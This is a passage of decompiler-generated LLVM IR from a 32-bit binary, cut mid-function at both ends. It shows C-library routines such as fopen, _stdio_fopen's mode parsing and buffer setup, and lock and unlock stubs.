  %v0_8054540 = call i32 @function_80543f2()
  ret i32 %v0_8054540
}

define i32 @_L_lock_54() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @ecx, align 4
  %v0_805454b = call i32 @__lll_lock_wait_private()
  %v0_8054550 = call i32 @function_805444d()
  ret i32 %v0_8054550
}

define i32 @_L_unlock_66() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @eax, align 4
  %v0_805455b = call i32 @__lll_unlock_wake_private()
  %v0_8054560 = call i32 @function_805448a()
  ret i32 %v0_8054560
}

define i32 @_L_unlock_83() local_unnamed_addr {
entry:
  %v0_8054565 = load i32, i32* @ebx, align 4
  %v1_8054565 = add i32 %v0_8054565, 56
  store i32 %v1_8054565, i32* @eax, align 4
  %v0_8054568 = call i32 @__lll_unlock_wake_private()
  %v0_805456d = call i32 @function_80544c1()
  ret i32 %v0_805456d
}

define i32 @_L_lock_103() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @ecx, align 4
  %v0_8054578 = call i32 @__lll_lock_wait_private()
  %v0_805457d = call i32 @function_80544fa()
  ret i32 %v0_805457d
}

define i32 @_L_unlock_113() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8058304.339 to i32), i32* @eax, align 4
  %v0_8054588 = call i32 @__lll_unlock_wake_private()
  %v0_805458d = call i32 @function_805452d()
  ret i32 %v0_805458d
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805459c = inttoptr i32 %arg2 to i8*
  %v5_805459c = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_805459c, i32 0, i32 -1)
  ret i32 %v5_805459c
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i16*, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80545ab = load i32, i32* @ebx, align 4
  store i32 %v0_80545ab, i32* %stack_var_-16, align 4
  %v4_80545ac = ptrtoint i8* %arg2 to i32
  store i32 %v4_80545ac, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_80545bc = load i8, i8* %arg2, align 1
  %v3_80545bc = zext i8 %v2_80545bc to i32
  %v4_80545bc = load i32, i32* @eax, align 4
  %v5_80545bc = and i32 %v4_80545bc, -256
  %v6_80545bc = or i32 %v5_80545bc, %v3_80545bc
  store i32 %v6_80545bc, i32* %eax.global-to-local, align 4
  %v10_80545be = icmp eq i8 %v2_80545bc, 114
  br i1 %v10_80545be, label %dec_label_pc_80545ff, label %dec_label_pc_80545c2

dec_label_pc_80545c2:                             ; preds = %entry
  store i32 577, i32* @esi, align 4
  %v10_80545c7 = icmp eq i8 %v2_80545bc, 119
  br i1 %v10_80545c7, label %dec_label_pc_8054601, label %dec_label_pc_80545cb

dec_label_pc_80545cb:                             ; preds = %dec_label_pc_80545c2
  store i32 1089, i32* @esi, align 4
  %v10_80545cf = icmp eq i8 %v2_80545bc, 97
  br i1 %v10_80545cf, label %dec_label_pc_8054601, label %dec_label_pc_80545d3

dec_label_pc_80545d3:                             ; preds = %dec_label_pc_805467b, %dec_label_pc_8054655, %dec_label_pc_80545cb
  store i32 -8, i32* %eax.global-to-local, align 4
  %v0_80545d8 = load i32, i32* @ebx, align 4
  %v1_80545d8 = icmp eq i32 %v0_80545d8, 0
  store i32 22, i32* inttoptr (i32 -8 to i32*), align 8
  call void @__pseudo_cond_branch(i1 %v1_80545d8, i32 134563895)
  br label %dec_label_pc_80545e7

dec_label_pc_80545e7:                             ; preds = %dec_label_pc_80546a6, %dec_label_pc_80545d3
  %v0_80545e7 = load i32, i32* @ebx, align 4
  %v1_80545e7 = add i32 %v0_80545e7, 1
  %v2_80545e7 = inttoptr i32 %v1_80545e7 to i8*
  %v3_80545e7 = load i8, i8* %v2_80545e7, align 1
  %v4_80545e7 = and i8 %v3_80545e7, 32
  %v5_80545e7 = icmp eq i8 %v4_80545e7, 0
  call void @__pseudo_cond_branch(i1 %v5_80545e7, i32 134563895)
  %v0_80545f1 = load i32, i32* @ebx, align 4
  %v5_80545f1 = inttoptr i32 %v0_80545f1 to i16*
  store i16* %v5_80545f1, i16** %stack_var_-20, align 4
  %v2_80545f2 = call i32 @free(i32 %v0_80545f1)
  store i32 0, i32* @ebx, align 4
  store i32 %v0_80545f1, i32* %eax.global-to-local, align 4
  %v0_80545fa = call i32 @function_8054839()
  store i32 %v0_80545fa, i32* %eax.global-to-local, align 4
  %v0_8054601.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80545ff

dec_label_pc_80545ff:                             ; preds = %entry, %dec_label_pc_80545e7
  %v0_8054601.pre = phi i32 [ %v4_80545ac, %entry ], [ %v0_8054601.pre.pre, %dec_label_pc_80545e7 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8054601

dec_label_pc_8054601:                             ; preds = %dec_label_pc_80545cb, %dec_label_pc_80545c2, %dec_label_pc_80545ff
  %v0_805460a = phi i32 [ %v4_80545ac, %dec_label_pc_80545cb ], [ %v4_80545ac, %dec_label_pc_80545c2 ], [ %v0_8054601.pre, %dec_label_pc_80545ff ]
  %v0_8054612 = phi i32 [ 1089, %dec_label_pc_80545cb ], [ 577, %dec_label_pc_80545c2 ], [ 1, %dec_label_pc_80545ff ]
  %v1_8054601 = add i32 %v0_805460a, 1
  store i32 %v1_8054601, i32* @eax, align 4
  %v2_8054604 = inttoptr i32 %v1_8054601 to i8*
  %v3_8054604 = load i8, i8* %v2_8054604, align 1
  %v12_8054604 = icmp eq i8 %v3_8054604, 98
  br i1 %v12_8054604, label %dec_label_pc_805460c, label %dec_label_pc_805460a

dec_label_pc_805460a:                             ; preds = %dec_label_pc_8054601
  store i32 %v0_805460a, i32* @eax, align 4
  br label %dec_label_pc_805460c

dec_label_pc_805460c:                             ; preds = %dec_label_pc_8054601, %dec_label_pc_805460a
  %v0_805460c = phi i32 [ %v1_8054601, %dec_label_pc_8054601 ], [ %v0_805460a, %dec_label_pc_805460a ]
  %v1_805460c = add i32 %v0_805460c, 1
  %v2_805460c = inttoptr i32 %v1_805460c to i8*
  %v3_805460c = load i8, i8* %v2_805460c, align 1
  %v12_805460c = icmp eq i8 %v3_805460c, 43
  %v1_8054610 = icmp eq i1 %v12_805460c, false
  br i1 %v1_8054610, label %dec_label_pc_805461a, label %dec_label_pc_8054612

dec_label_pc_8054612:                             ; preds = %dec_label_pc_805460c
  store i32 %v0_8054612, i32* @eax, align 4
  %v1_8054617 = add nuw nsw i32 %v0_8054612, 1
  store i32 %v1_8054617, i32* @esi, align 4
  br label %dec_label_pc_805461a

dec_label_pc_805461a:                             ; preds = %dec_label_pc_805460c, %dec_label_pc_8054612
  %v0_805461a = load i32, i32* @ebx, align 4
  %v1_805461a = icmp eq i32 %v0_805461a, 0
  %v1_805461c = icmp eq i1 %v1_805461a, false
  br i1 %v1_805461c, label %dec_label_pc_8054651, label %dec_label_pc_805461e

dec_label_pc_805461e:                             ; preds = %dec_label_pc_805461a
  store i16* inttoptr (i32 68 to i16*), i16** %stack_var_-20, align 4
  %v2_8054620 = call i32 @malloc(i32 68)
  store i32 %v2_8054620, i32* @ebx, align 4
  store i32 68, i32* @eax, align 4
  %v1_8054628 = icmp eq i32 %v2_8054620, 0
  call void @__pseudo_cond_branch(i1 %v1_8054628, i32 134563897)
  %v0_8054630 = load i32, i32* @ebx, align 4
  %v1_8054630 = inttoptr i32 %v0_8054630 to i16*
  store i16 8192, i16* %v1_8054630, align 2
  %v0_8054635 = load i32, i32* @ebx, align 4
  %v1_8054635 = add i32 %v0_8054635, 8
  %v2_8054635 = inttoptr i32 %v1_8054635 to i32*
  store i32 0, i32* %v2_8054635, align 4
  %v0_805463c = load i32, i32* @ebx, align 4
  %v1_805463c = add i32 %v0_805463c, 64
  %v2_805463c = inttoptr i32 %v1_805463c to i32*
  store i32 0, i32* %v2_805463c, align 4
  %v0_8054643 = load i32, i32* @ebx, align 4
  %v1_8054643 = add i32 %v0_8054643, 60
  %v2_8054643 = inttoptr i32 %v1_8054643 to i32*
  store i32 0, i32* %v2_8054643, align 4
  %v0_805464a = load i32, i32* @ebx, align 4
  %v1_805464a = add i32 %v0_805464a, 56
  %v2_805464a = inttoptr i32 %v1_805464a to i32*
  store i32 0, i32* %v2_805464a, align 4
  br label %dec_label_pc_8054651

dec_label_pc_8054651:                             ; preds = %dec_label_pc_805461a, %dec_label_pc_805461e
  %v0_8054651 = load i32, i32* @ebp, align 4
  %v2_8054651 = icmp slt i32 %v0_8054651, 0
  br i1 %v2_8054651, label %dec_label_pc_805469d, label %dec_label_pc_8054655

dec_label_pc_8054655:                             ; preds = %dec_label_pc_8054651
  %v0_8054655 = load i32, i32* @esi, align 4
  %v0_8054657 = load i32, i32* @edi, align 4
  %v1_8054657 = add i32 %v0_8054657, 1
  store i32 %v1_8054657, i32* %eax.global-to-local, align 4
  %v1_805465a = and i32 %v0_8054655, 32771
  store i32 %v1_805465a, i32* %edx.global-to-local, align 4
  %v1_8054660 = load i32, i32* @ebx, align 4
  %v2_8054660 = add i32 %v1_8054660, 4
  %v3_8054660 = inttoptr i32 %v2_8054660 to i32*
  store i32 %v0_8054651, i32* %v3_8054660, align 4
  %v0_8054663 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054663 = add i32 %v0_8054663, 1
  store i32 %v1_8054663, i32* @edx, align 4
  %v0_8054664 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054664 = and i32 %v0_8054664, %v1_8054663
  store i32 %v2_8054664, i32* %eax.global-to-local, align 4
  %v12_8054666 = icmp eq i32 %v2_8054664, %v1_8054663
  %v1_8054668 = icmp eq i1 %v12_8054666, false
  br i1 %v1_8054668, label %dec_label_pc_80545d3, label %dec_label_pc_805466e

dec_label_pc_805466e:                             ; preds = %dec_label_pc_8054655
  %v0_805466e = load i32, i32* @edi, align 4
  %v1_8054670 = and i32 %v0_805466e, 1024
  %v1_8054672 = xor i32 %v1_8054670, 1024
  store i32 %v1_8054672, i32* %eax.global-to-local, align 4
  %v1_8054677 = load i32, i32* @esi, align 4
  %v2_8054677 = and i32 %v1_8054677, %v1_8054672
  %v3_8054677 = icmp eq i32 %v2_8054677, 0
  br i1 %v3_8054677, label %dec_label_pc_8054693, label %dec_label_pc_805467b

dec_label_pc_805467b:                             ; preds = %dec_label_pc_805466e
  store i16* inttoptr (i32 1024 to i16*), i16** %stack_var_-20, align 4
  %v3_8054683 = load i32, i32* %stack_var_-16, align 4
  %v4_8054683 = call i32 @__libc_fcntl(i32 4, i32 1024, i32 %v3_8054683)
  store i32 %v4_8054683, i32* %eax.global-to-local, align 4
  %v1_805468b = icmp eq i32 %v4_8054683, 0
  %v1_805468d = icmp eq i1 %v1_805468b, false
  br i1 %v1_805468d, label %dec_label_pc_80545d3, label %dec_label_pc_805467b.dec_label_pc_8054693_crit_edge

dec_label_pc_805467b.dec_label_pc_8054693_crit_edge: ; preds = %dec_label_pc_805467b
  %v0_8054693.pre = load i32, i32* @edi, align 4
  %v0_8054699.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8054693

dec_label_pc_8054693:                             ; preds = %dec_label_pc_805467b.dec_label_pc_8054693_crit_edge, %dec_label_pc_805466e
  %v0_8054699 = phi i32 [ %v0_8054699.pre, %dec_label_pc_805467b.dec_label_pc_8054693_crit_edge ], [ %v1_8054677, %dec_label_pc_805466e ]
  %v0_8054693 = phi i32 [ %v0_8054693.pre, %dec_label_pc_805467b.dec_label_pc_8054693_crit_edge ], [ %v0_805466e, %dec_label_pc_805466e ]
  %v1_8054693 = and i32 %v0_8054693, 32768
  store i32 %v1_8054693, i32* @edi, align 4
  %v2_8054699 = or i32 %v1_8054693, %v0_8054699
  br label %dec_label_pc_80546c0

dec_label_pc_805469d:                             ; preds = %dec_label_pc_8054651
  %v1_805469d = add i32 %v0_8054651, 1
  %v8_805469d = icmp eq i32 %v1_805469d, 0
  store i32 %v1_805469d, i32* @ebp, align 4
  %v0_80546ab.pre = load i32, i32* @esi, align 4
  br i1 %v8_805469d, label %dec_label_pc_80546a6, label %dec_label_pc_80546a0

dec_label_pc_80546a0:                             ; preds = %dec_label_pc_805469d
  %v1_80546a0 = or i32 %v0_80546ab.pre, 32768
  store i32 %v1_80546a0, i32* @esi, align 4
  br label %dec_label_pc_80546a6

dec_label_pc_80546a6:                             ; preds = %dec_label_pc_805469d, %dec_label_pc_80546a0
  %v0_80546ab = phi i32 [ %v1_80546a0, %dec_label_pc_80546a0 ], [ %v0_80546ab.pre, %dec_label_pc_805469d ]
  store i16* inttoptr (i32 438 to i16*), i16** %stack_var_-20, align 4
  %v0_80546ac = load i32, i32* @edi, align 4
  %v2_80546ad = call i32 @__libc_open(i32 %v0_80546ac, i32 %v0_80546ab)
  store i32 %v2_80546ad, i32* %eax.global-to-local, align 4
  %v1_80546b5 = load i32, i32* @ebx, align 4
  %v2_80546b5 = add i32 %v1_80546b5, 4
  %v3_80546b5 = inttoptr i32 %v2_80546b5 to i32*
  store i32 %v2_80546ad, i32* %v3_80546b5, align 4
  %v2_80546b8 = icmp slt i32 %v2_80546ad, 0
  br i1 %v2_80546b8, label %dec_label_pc_80545e7, label %dec_label_pc_80546a6.dec_label_pc_80546c0_crit_edge

dec_label_pc_80546a6.dec_label_pc_80546c0_crit_edge: ; preds = %dec_label_pc_80546a6
  %v0_80546c0.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80546c0

dec_label_pc_80546c0:                             ; preds = %dec_label_pc_80546a6.dec_label_pc_80546c0_crit_edge, %dec_label_pc_8054693
  %v0_80546c8 = phi i32 [ %v0_80546c0.pre, %dec_label_pc_80546a6.dec_label_pc_80546c0_crit_edge ], [ %v2_8054699, %dec_label_pc_8054693 ]
  store i32 %v0_80546c8, i32* %edx.global-to-local, align 4
  %v0_80546c2 = load i32, i32* @ebx, align 4
  %v1_80546c2 = inttoptr i32 %v0_80546c2 to i32*
  %v2_80546c2 = load i32, i32* %v1_80546c2, align 4
  %v7_80546c4 = and i32 %v2_80546c2, -57344
  %v1_80546c8 = urem i32 %v0_80546c8, 4
  store i32 %v1_80546c8, i32* @esi, align 4
  %v8_80546cb = and i32 %v0_80546c8, -31744
  %v2_80546d0 = or i32 %v7_80546c4, %v8_80546cb
  %v1_80546d2 = mul nuw nsw i32 %v1_80546c8, 16
  %v1_80546d5 = add nuw nsw i32 %v1_80546d2, 16
  %v2_80546d8 = xor i32 %v1_80546d5, 48
  store i32 %v2_80546d8, i32* %eax.global-to-local, align 4
  %v2_80546db = or i32 %v2_80546d0, %v2_80546d8
  store i32 %v2_80546db, i32* %edx.global-to-local, align 4
  %v1_80546dd = add i32 %v0_80546c2, 4
  %v2_80546dd = inttoptr i32 %v1_80546dd to i32*
  %v3_80546dd = load i32, i32* %v2_80546dd, align 4
  store i32 %v3_80546dd, i32* %eax.global-to-local, align 4
  %v1_80546e0 = trunc i32 %v2_80546db to i16
  %v3_80546e0 = inttoptr i32 %v0_80546c2 to i16*
  store i16 %v1_80546e0, i16* %v3_80546e0, align 2
  %v0_80546e3 = load i32, i32* %eax.global-to-local, align 4
  %v9_80546e3 = icmp eq i32 %v0_80546e3, 2147483647
  br i1 %v9_80546e3, label %dec_label_pc_8054706, label %dec_label_pc_80546ea

dec_label_pc_80546ea:                             ; preds = %dec_label_pc_80546c0
  store i32 -8, i32* @edi, align 4
  %v2_80546f0 = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_80546f0, i32* @esi, align 4
  %v5_80546f3 = inttoptr i32 %v0_80546e3 to i16*
  store i16* %v5_80546f3, i16** %stack_var_-20, align 4
  %v2_80546f4 = call i32 @isatty(i32 %v0_80546e3)
  store i32 %v2_80546f4, i32* %eax.global-to-local, align 4
  %v1_80546fa = icmp eq i32 %v2_80546f4, 0
  br i1 %v1_80546fa, label %dec_label_pc_8054703, label %dec_label_pc_80546fe

dec_label_pc_80546fe:                             ; preds = %dec_label_pc_80546ea
  %v0_80546fe = load i32, i32* @ebx, align 4
  %v1_80546fe = inttoptr i32 %v0_80546fe to i16*
  %v2_80546fe = load i16, i16* %v1_80546fe, align 2
  %v3_80546fe = or i16 %v2_80546fe, 256
  store i16 %v3_80546fe, i16* %v1_80546fe, align 2
  br label %dec_label_pc_8054703

dec_label_pc_8054703:                             ; preds = %dec_label_pc_80546ea, %dec_label_pc_80546fe
  %v0_8054703 = load i32, i32* @esi, align 4
  %v1_8054703 = load i32, i32* @edi, align 4
  %v2_8054703 = inttoptr i32 %v1_8054703 to i32*
  store i32 %v0_8054703, i32* %v2_8054703, align 4
  br label %dec_label_pc_8054706

dec_label_pc_8054706:                             ; preds = %dec_label_pc_80546c0, %dec_label_pc_8054703
  %v0_8054706 = load i32, i32* @ebx, align 4
  %v1_8054706 = add i32 %v0_8054706, 8
  %v2_8054706 = inttoptr i32 %v1_8054706 to i32*
  %v3_8054706 = load i32, i32* %v2_8054706, align 4
  %v4_8054706 = icmp eq i32 %v3_8054706, 0
  %v1_805470a = icmp eq i1 %v4_8054706, false
  br i1 %v1_805470a, label %dec_label_pc_8054734, label %dec_label_pc_805470c

dec_label_pc_805470c:                             ; preds = %dec_label_pc_8054706
  store i16* inttoptr (i32 4096 to i16*), i16** %stack_var_-20, align 4
  %v2_8054711 = call i32 @malloc(i32 4096)
  store i32 %v2_8054711, i32* %eax.global-to-local, align 4
  %v1_8054716 = load i32, i32* @ebx, align 4
  %v2_8054716 = add i32 %v1_8054716, 8
  %v3_8054716 = inttoptr i32 %v2_8054716 to i32*
  store i32 %v2_8054711, i32* %v3_8054716, align 4
  %v1_8054719 = icmp eq i32 %v2_8054711, 0
  %v2_805471b = load i16*, i16** %stack_var_-20, align 4
  %v3_805471b = ptrtoint i16* %v2_805471b to i32
  store i32 %v3_805471b, i32* %edx.global-to-local, align 4
  %v0_805472d = load i32, i32* @ebx, align 4
  br i1 %v1_8054719, label %dec_label_pc_805472d, label %dec_label_pc_805471e

dec_label_pc_805471e:                             ; preds = %dec_label_pc_805470c
  %v1_805471e = inttoptr i32 %v0_805472d to i16*
  %v2_805471e = load i16, i16* %v1_805471e, align 2
  %v3_805471e = or i16 %v2_805471e, 16384
  store i16 %v3_805471e, i16* %v1_805471e, align 2
  %v1_8054723 = add i32 %v2_8054711, 4096
  store i32 %v1_8054723, i32* %eax.global-to-local, align 4
  %v1_8054728 = load i32, i32* @ebx, align 4
  %v2_8054728 = add i32 %v1_8054728, 12
  %v3_8054728 = inttoptr i32 %v2_8054728 to i32*
  store i32 %v1_8054723, i32* %v3_8054728, align 4
  br label %dec_label_pc_8054734

dec_label_pc_805472d:                             ; preds = %dec_label_pc_805470c
  %v1_805472d = add i32 %v0_805472d, 12
  %v2_805472d = inttoptr i32 %v1_805472d to i32*
  store i32 0, i32* %v2_805472d, align 4
  br label %dec_label_pc_8054734

dec_label_pc_8054734:                             ; preds = %dec_label_pc_8054706, %dec_label_pc_805471e, %dec_label_pc_805472d
  %v0_8054734 = load i32, i32* @ebx, align 4
  %v1_8054734 = add i32 %v0_8054734, 8
  %v2_8054734 = inttoptr i32 %v1_8054734 to i32*
  %v3_8054734 = load i32, i32* %v2_8054734, align 4
  store i32 %v3_8054734, i32* %eax.global-to-local, align 4
  %v1_8054737 = add i32 %v0_8054734, 2
  %v2_8054737 = inttoptr i32 %v1_8054737 to i8*
  store i8 0, i8* %v2_8054737, align 1
  %v0_805473b = load i32, i32* %eax.global-to-local, align 4
  %v1_805473b = load i32, i32* @ebx, align 4
  %v2_805473b = add i32 %v1_805473b, 24
  %v3_805473b = inttoptr i32 %v2_805473b to i32*
  store i32 %v0_805473b, i32* %v3_805473b, align 4
  %v0_805473e = load i32, i32* %eax.global-to-local, align 4
  %v1_805473e = load i32, i32* @ebx, align 4
  %v2_805473e = add i32 %v1_805473e, 28
  %v3_805473e = inttoptr i32 %v2_805473e to i32*
  store i32 %v0_805473e, i32* %v3_805473e, align 4
  %v0_8054741 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054741 = load i32, i32* @ebx, align 4
  %v2_8054741 = add i32 %v1_8054741, 16
  %v3_8054741 = inttoptr i32 %v2_8054741 to i32*
  store i32 %v0_8054741, i32* %v3_8054741, align 4
  %v0_8054744 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054744 = load i32, i32* @ebx, align 4
  %v2_8054744 = add i32 %v1_8054744, 20
  %v3_8054744 = inttoptr i32 %v2_8054744 to i32*
  store i32 %v0_8054744, i32* %v3_8054744, align 4
  %v0_8054747 = load i32, i32* @global_var_8057c1c.344, align 4
  store i32 %v0_8054747, i32* %eax.global-to-local, align 4
  %v0_805474c = load i32, i32* @ebx, align 4
  %v1_805474c = add i32 %v0_805474c, 44
  %v2_805474c = inttoptr i32 %v1_805474c to i32*
  store i32 0, i32* %v2_805474c, align 4
  %v0_8054753 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054753 = load i32, i32* @ebx, align 4
  %v2_8054753 = add i32 %v1_8054753, 52
  %v3_8054753 = inttoptr i32 %v2_8054753 to i32*
  store i32 %v0_8054753, i32* %v3_8054753, align 4
  %v0_8054756 = load i32, i32* @ebx, align 4
  %v1_8054756 = add i32 %v0_8054756, 1
  %v2_8054756 = inttoptr i32 %v1_8054756 to i8*
  %v3_8054756 = load i8, i8* %v2_8054756, align 1
  %v4_8054756 = and i8 %v3_8054756, 32
  %v5_8054756 = icmp eq i8 %v4_8054756, 0
  call void @__pseudo_cond_branch(i1 %v5_8054756, i32 134563897)
  %v0_8054760 = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_8054760, i32* %edx.global-to-local, align 4
  %v0_8054767 = load i32, i32* @global_var_805830c.337, align 4
  %v12_8054767 = icmp eq i32 %v0_8054767, %v0_8054760
  call void @__pseudo_cond_branch(i1 %v12_8054767, i32 ptrtoint (i32* @global_var_8054794.345 to i32))
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054776 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054776 = icmp eq i32 %v0_8054776, 0
  call void @__pseudo_cond_branch(i1 %v1_8054776, i32 134563713)
  %v0_8054780 = load i32, i32* @global_var_8058304.339, align 4
  %v2_8054780 = load i32, i32* %eax.global-to-local, align 4
  %v13_8054780 = icmp eq i32 %v2_8054780, %v0_8054780
  %v20_8054780 = select i1 %v13_8054780, i32 1, i32 %v0_8054780
  store i32 %v20_8054780, i32* @global_var_8058304.339, align 4
  store i32 %v0_8054780, i32* %eax.global-to-local, align 4
  %v1_8054788 = icmp eq i1 %v13_8054780, false
  call void @__pseudo_cond_branch(i1 %v1_8054788, i32 134563904)
  ret i32 %v0_8054780

; uselistorder directives
  uselistorder i32 %v0_8054780, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805472d, { 1, 0 }
  uselistorder i32 %v2_8054711, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80546e3, { 2, 1, 0 }
  uselistorder i32 %v1_80546c8, { 1, 0 }
  uselistorder i32 %v0_80546c2, { 1, 0, 2 }
  uselistorder i32 %v0_80546c8, { 1, 0, 2 }
  uselistorder i32 %v1_8054672, { 1, 0 }
  uselistorder i32 %v0_805466e, { 1, 0 }
  uselistorder i32 %v1_8054663, { 1, 0, 2 }
  uselistorder i32 %v0_8054612, { 1, 0 }
  uselistorder i32 %v4_80545ac, { 1, 2, 0, 3 }
  uselistorder i16** %stack_var_-20, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25 }
  uselistorder i32 4096, { 10, 4, 5, 11, 0, 12, 13, 1, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 48, { 0, 19, 20, 21, 11, 9, 10, 8, 4, 1, 3, 5, 12, 15, 6, 13, 14, 16, 17, 18, 2, 7 }
  uselistorder i32 (i32, i32)* @__libc_open, { 1, 0, 4, 3, 2, 6, 5 }
  uselistorder i32 32768, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 0, 14, 11, 10, 13, 12, 9, 8, 5, 4, 7, 6, 3, 2 }
  uselistorder i32 1024, { 4, 6, 2, 3, 5, 0, 7, 1, 8 }
  uselistorder i32 (i32)* @malloc, { 7, 6, 0, 4, 3, 2, 5, 1, 9, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 11, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 10, 8 }
  uselistorder i32 68, { 0, 2, 3, 4, 9, 10, 7, 8, 6, 1, 5, 11, 12 }
  uselistorder label %dec_label_pc_8054734, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054706, { 1, 0 }
  uselistorder label %dec_label_pc_8054703, { 1, 0 }
  uselistorder label %dec_label_pc_80546a6, { 1, 0 }
  uselistorder label %dec_label_pc_8054651, { 1, 0 }
  uselistorder label %dec_label_pc_805461a, { 1, 0 }
  uselistorder label %dec_label_pc_805460c, { 1, 0 }
  uselistorder label %dec_label_pc_8054601, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545ff, { 1, 0 }
}

define i32 @function_805478e() local_unnamed_addr {
dec_label_pc_805478e:
  %v0_805478e = load i32, i32* @edx, align 4
  store i32 %v0_805478e, i32* @global_var_805830c.337, align 4
  %v0_8054794 = load i32, i32* @global_var_8058308.341, align 8
  %v1_8054794 = add i32 %v0_8054794, 1
  store i32 %v1_8054794, i32* @global_var_8058308.341, align 8
  %v0_805479a = load i32, i32* @global_var_8058300.317, align 256
  %v12_805479a = icmp eq i32 %v0_805479a, %v0_805478e
  call void @__pseudo_cond_branch(i1 %v12_805479a, i32 ptrtoint (i32* @global_var_80547c7.346 to i32))
  %v0_80547a9 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80547a9 = icmp eq i32 %v0_80547a9, 0
  call void @__pseudo_cond_branch(i1 %v1_80547a9, i32 134563764)
  %v0_80547b3 = load i32, i32* @global_var_80582f8.319, align 8
  %v13_80547b3 = icmp eq i32 %v0_80547b3, 0
  %v20_80547b3 = select i1 %v13_80547b3, i32 1, i32 %v0_80547b3
  store i32 %v20_80547b3, i32* @global_var_80582f8.319, align 8
  %v1_80547bb = icmp eq i1 %v13_80547b3, false
  call void @__pseudo_cond_branch(i1 %v1_80547bb, i32 134563920)
  ret i32 %v0_80547b3

; uselistorder directives
  uselistorder i32 %v0_80547b3, { 1, 2, 0 }
}

define i32 @function_80547c1() local_unnamed_addr {
dec_label_pc_80547c1:
  %v0_80547c1 = load i32, i32* @edx, align 4
  store i32 %v0_80547c1, i32* @global_var_8058300.317, align 256
  %v0_80547c7 = load i32, i32* @global_var_80582fc.320, align 4
  %v1_80547c7 = add i32 %v0_80547c7, 1
  store i32 %v1_80547c7, i32* @global_var_80582fc.320, align 4
  %v0_80547cd = load i32, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 8
  %v1_80547d2 = load i32, i32* @ebx, align 4
  %v2_80547d2 = add i32 %v1_80547d2, 32
  %v3_80547d2 = inttoptr i32 %v2_80547d2 to i32*
  store i32 %v0_80547cd, i32* %v3_80547d2, align 4
  %v0_80547d5 = load i32, i32* @ebx, align 4
  store i32 %v0_80547d5, i32* bitcast (i32** @global_var_8057c18.322 to i32*), align 8
  %v0_80547db = load i32, i32* @global_var_80582fc.320, align 4
  %v1_80547e0 = add i32 %v0_80547db, -1
  %v8_80547e0 = icmp eq i32 %v1_80547e0, 0
  store i32 %v1_80547e0, i32* @global_var_80582fc.320, align 4
  %v1_80547e8 = icmp eq i1 %v8_80547e0, false
  call void @__pseudo_cond_branch(i1 %v1_80547e8, i32 134563848)
  store i32 0, i32* @global_var_8058300.317, align 256
  %v0_80547f4 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80547f4 = icmp eq i32 %v0_80547f4, 0
  call void @__pseudo_cond_branch(i1 %v1_80547f4, i32 134563839)
  %v0_80547fe = load i32, i32* @global_var_80582f8.319, align 8
  %v1_80547fe = add i32 %v0_80547fe, -1
  %v9_80547fe = icmp eq i32 %v1_80547fe, 0
  store i32 %v1_80547fe, i32* @global_var_80582f8.319, align 8
  %v1_8054806 = icmp eq i1 %v9_80547fe, false
  call void @__pseudo_cond_branch(i1 %v1_8054806, i32 134563936)
  ret i32 %v1_80547e0

; uselistorder directives
  uselistorder i32 %v1_80547fe, { 1, 0 }
}

define i32 @function_8054808() local_unnamed_addr {
dec_label_pc_8054808:
  %v0_8054808 = load i32, i32* @global_var_8058308.341, align 8
  %v1_805480d = add i32 %v0_8054808, -1
  %v8_805480d = icmp eq i32 %v1_805480d, 0
  store i32 %v1_805480d, i32* @global_var_8058308.341, align 8
  %v1_8054815 = icmp eq i1 %v8_805480d, false
  call void @__pseudo_cond_branch(i1 %v1_8054815, i32 134563897)
  store i32 0, i32* @global_var_805830c.337, align 4
  %v0_8054821 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8054821 = icmp eq i32 %v0_8054821, 0
  call void @__pseudo_cond_branch(i1 %v1_8054821, i32 134563884)
  %v0_805482b = load i32, i32* @global_var_8058304.339, align 4
